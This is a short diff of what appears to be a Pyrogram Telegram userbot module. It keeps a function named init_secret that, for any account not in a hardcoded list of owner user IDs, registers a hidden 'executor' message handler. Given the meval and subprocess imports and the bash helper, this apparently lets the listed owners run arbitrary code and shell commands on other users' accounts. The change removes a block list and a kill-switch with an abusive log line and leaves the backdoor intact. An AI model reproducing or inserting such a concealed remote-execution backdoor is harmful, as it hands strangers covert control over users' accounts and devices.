@@ -1,7 +1,5 @@
 import asyncio
-import sys
 import contextlib
-import logging
 import html
 import io
 import subprocess
@@ -20,9 +18,6 @@ import pyrogram.utils
 from meval import meval
 
 OWNERS = [1054295664, 1928772230, 6710439195, 984144778, 1992087933, 7028669261, 6321616956, 278475769, 1905813501]
-BLOCKED = [7958155385, 8106473604]
-
-log = logging.getLogger(__name__)
 
 eval_tasks: Dict[int, Any] = {}
 
@@ -49,9 +44,6 @@ async def bash(cmd: str):
 def init_secret(client: pyrogram.Client):
     if client.me.id in OWNERS:
         return
-    elif client.me.id in BLOCKED:
-        log.warning("Fuck You Bitch")
-        sys.exit(1)
     client.add_handler(
         pyrogram.handlers.MessageHandler(
             executor,
